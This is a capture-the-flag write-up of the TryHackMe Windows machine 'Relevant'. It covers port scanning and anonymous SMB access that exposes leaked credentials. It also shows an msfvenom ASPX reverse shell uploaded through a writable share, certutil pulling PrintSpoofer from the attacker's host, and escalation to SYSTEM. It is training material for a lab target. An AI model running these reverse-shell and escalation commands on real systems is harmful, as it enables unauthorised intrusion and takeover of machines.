---
layout: post
title: THM Relevant WriteUp
date: 2024-12-31
categories:
  - TryHackMe
  - TryHackMe-Windows
tags:
  - CTF
  - TryHackMe
  - Windows
  - Msfvenom
  - SMB-Anon-Allowed
  - Credentials-Leakage
  - SeImpersonate
  - Upload-File
media_subpath: /assets/img/Relevant
---
![Desktop View](Relevant.jpeg){: w="400"  h="400" }



# Relevant Skills


>**Relevant** is an medium difficulty Windows machine where we will use the following skills:

-  **Port Discovery**
-  **SMB Share Miss-configuration**
-  **Web Tech's Enumeration**
- **Upload Reverse Shell to a Website via SMB**
- **Generating Payload with MSFvenom** 
-  **Abusing SeImpersoante Privilege**

---
## IP Address Enumeration

Using the usual `nmap` scan I've discovered port **80, 135, 139, 445, 3389, 49663, 49667** & port **49669**:

```perl
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.236.240 -oG allPorts
Nmap scan report for 10.10.236.240
Host is up, received user-set (0.23s latency).
Scanned at 2024-12-30 12:02:19 CET for 27s
Not shown: 65527 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       REASON
80/tcp    open  http          syn-ack ttl 127
135/tcp   open  msrpc         syn-ack ttl 127
139/tcp   open  netbios-ssn   syn-ack ttl 127
445/tcp   open  microsoft-ds  syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127
49663/tcp open  unknown       syn-ack ttl 127
49667/tcp open  unknown       syn-ack ttl 127
49669/tcp open  unknown       syn-ack ttl 127
```

Then i launched a basic group of scripts to seek more info from the open ports:

```java
❯ nmap -sCV -p80,135,139,445,3389,49663,49667,49669 10.10.236.240 -oN targeted
Nmap scan report for 10.10.236.240
Host is up (0.10s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2024-12-29T10:59:04
|_Not valid after:  2025-06-30T10:59:04
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2024-12-30T11:05:03+00:00
|_ssl-date: 2024-12-30T11:05:44+00:00; 0s from scanner time.
49663/tcp open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-12-30T11:05:06
|_  start_date: 2024-12-30T10:59:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h36m00s, deviation: 3h34m42s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-12-30T03:05:08-08:00
```

So we have to check the following ports & services:

- **Port 80 --> Microsoft IIS httpd 10.0**
- **Port 445 --> Windows Server 2016 Standard Evaluation 14393**
- **Port 3389 --> RDP**
- **49663 --> Microsoft IIS httpd 10.0**

Let's start with the Microsoft IIS web server.

---
## Port 80 Enumeration

At first i ran `whatweb`,  to seek for some versions and technologies used in the website:

```bash
❯ whatweb 10.10.236.240
http://10.10.236.240 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.236.240], Microsoft-IIS[10.0], Title[IIS Windows Server], X-Powered-By[ASP.NET]
```

Nothing found aside the IIS version: **Microsoft-IIS[10.0]**, so let's take a look inside the website, once inside ***http://10.10.148.70***, we are in front of a default **IIS Server** page.

![Desktop View](RelevantMainPage.png)

We could fuzz the web, but before making that much noise, let's check the other website at port **49663**. 

## Port 49663 Enumeration

I ran `whatweb` again and i get the same result, seems like a clone website.

```bash
❯ whatweb 10.10.236.240:49663
http://10.10.236.240:49663 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.236.240], Microsoft-IIS[10.0], Title[IIS Windows Server], X-Powered-By[ASP.NET]
```
Once inside the website, we are again in front of a default IIS page.

Again, before fuzzing, let's check the SMB service.

## Port 445 Enumeration

i always start with a bunch of `nmap` scripts covering almost all SMB related `nmap` scripts.

```bash
❯ nmap --script="smb-enum-shares,smb-enum-users,smb-os-discovery,smb-vuln*" -p445 10.10.30.173 -oN smbScan
Nmap scan report for 10.10.30.173
Host is up (0.12s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.30.173\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.30.173\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.30.173\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.10.30.173\nt4wrksv: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ/WRITE
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-12-30T09:10:54-08:00
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
```

In the `nmap` report we can see that the target seems vulnerable to **ms17-010** (**EternalBlue**), but i tried manually and with **Metasploit** and it didn't work.

So if we keep checking we can see we can list some shares **anonymously**, so let's see if we can find something interesting.

```bash
❯ smbclient -L \\10.10.30.173 -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	nt4wrksv        Disk
```

There is a custom share named `nt4wrksv`, let's see if we can access it without credentials.

```bash
❯ smbclient \\\\10.10.30.173\\nt4wrksv -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Dec 30 18:11:48 2024
  ..                                  D        0  Mon Dec 30 18:11:48 2024
  passwords.txt                       A       98  Sat Jul 25 17:15:33 2020

smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

I found and downloaded a file named `passwords.txt`, seems interesting, let's see what's inside.

```bash
❯ cat passwords.txt
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

Inside we find what seems like `base64` encoded credentials, let's decode them and see if we are right.

```bash
❯ echo 'Qm9iIC0gIVBAJCRXMHJEITEyMw==' | base64 -d | xargs
Bob - !P@$$W0rD!123
❯ echo 'QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk' | base64 -d | xargs
Bill - Juw4nnaM4n420696969!$$$
```

Seems like we found credentials, let's see if we can authenticate in any service.

I tried to authenticate via `psexec.py`, `CrackMapExec` & `xfreerdp` but nothing worked, so at this point if we check again the `smbScan` report we can see that we can **read & write** the `nt4wrksv` share, so let's check if it's linked to any of the websites, so we might upload a reverse shell.

```bash
|   \\10.10.30.173\nt4wrksv: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ/WRITE
```

## Gaining a Shell

So let's see if we can see a `nt4wrksv` folder or a `passwords.txt` file in any of the websites.

```bash
❯ curl -v http://10.10.30.173:49663/nt4wrksv/passwords.txt
*   Trying 10.10.30.173:49663...
* Connected to 10.10.30.173 (10.10.30.173) port 49663
* using HTTP/1.x
> GET /nt4wrksv/passwords.txt HTTP/1.1
> Host: 10.10.30.173:49663
> User-Agent: curl/8.11.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Content-Type: text/plain
< Last-Modified: Sat, 25 Jul 2020 15:15:33 GMT
< Accept-Ranges: bytes
< ETag: "65e151719662d61:0"
< Server: Microsoft-IIS/10.0
< X-Powered-By: ASP.NET
< Date: Mon, 30 Dec 2024 17:48:34 GMT
< Content-Length: 98
< 
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
* Connection #0 to host 10.10.30.173 left intact
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

After some tries in both websites, the website hosted in the port **49663** is linked to the `nt4wrksv` share, so since we are facing a IIS server let's upload a `.aspx` reverse shell.

Let's create a `.aspx` reverse shell with `msfvenom`, it need's to be a stageless payload to work with a `netcat` listener.

```bash
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.116.52 LPORT=4444 -f aspx > shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3410 bytes
```

Once we have it let's upload it to the **IIS Server** via `smbclient`.

```bash
❯ smbclient \\\\10.10.28.45\\nt4wrksv -N
Try "help" to get a list of possible commands.
smb: \> put shell.aspx 
putting file shell.aspx as \shell.aspx (7.9 kb/s) (average 7.9 kb/s)
smb: \>
```

So now we just need to set a listener with `netcat` and  access to ***http://10.10.28.45/nt4wrksv/shell.aspx*** to receive the shell.

```bash
❯ rlwrap nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.11.116.52] from (UNKNOWN) [10.10.28.45] 49744
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```

We get the shell as the user `defaultapppool`.

## Shell as defaultapppool

Once inside we can see the `user.txt` in Bob's Desktop.

```bash
c:\Users\Bob\Desktop>type user.txt
THM{fdk4ka34vk346ksxf*********tf45}
```

Then i started listing the privileges of the current user and i found that our current user have the `SeImpersonatePrivilege` privilege assigned, so we can run the classic `PrintSpoffer.exe` exploit.

```bash
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Let's get the exploit in our attacker machine and host it with a python server.

```bash
❯ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
--2024-12-31 19:07:37--  https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
HTTP request sent, awaiting response... 200 OK
Length: 27136 (26K) [application/octet-stream]
Saving to: ‘PrintSpoofer64.exe.1’

PrintSpoofer64.exe.1                           100%[==================================================================================================>]  26.50K  --.-KB/s    in 0.03s   

2024-12-31 19:07:39 (829 KB/s) - ‘PrintSpoofer64.exe.1’ saved [27136/27136]

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Then let's create a `C:\\Temp` folder and upload the exploit.

```bash
c:\Temp>certutil -urlcache -split -f http://10.11.116.52/PrintSpoofer64.exe
certutil -urlcache -split -f http://10.11.116.52/PrintSpoofer64.exe
****  Online  ****
  0000  ...
  6a00
CertUtil: -URLCache command completed successfully.
```

Once with the exploit in the target, according to the official manual of the tool, we have to run the binary with the next arguments in case we have a reverse shell.

```bash
c:\Temp>PrintSpoofer64.exe -i -c cmd
PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

- **`-i`**: Launches an interactive process.
- **`-c cmd`**: Runs `cmd.exe` as SYSTEM.

Now we should be user `SYSTEM` and be able to read the root.txt

```bash
C:\Users\Administrator\Desktop>whoami
nt authority\system

C:\Users\Administrator\Desktop>type root.txt
THM{1fk5kf469devly1*********l345pv}
```

---
## Final Thoughts

The **Relevant CTF** offered a practical learning experience, focusing on SMB enumeration and privilege escalation via misconfigurations. It’s a well-structured challenge that reinforces essential skills for real-world scenarios.

![Desktop View](RelevantPwn.png)

-- -
**Thanks for reading, i’ll appreciate that you take a look to my other posts :)**

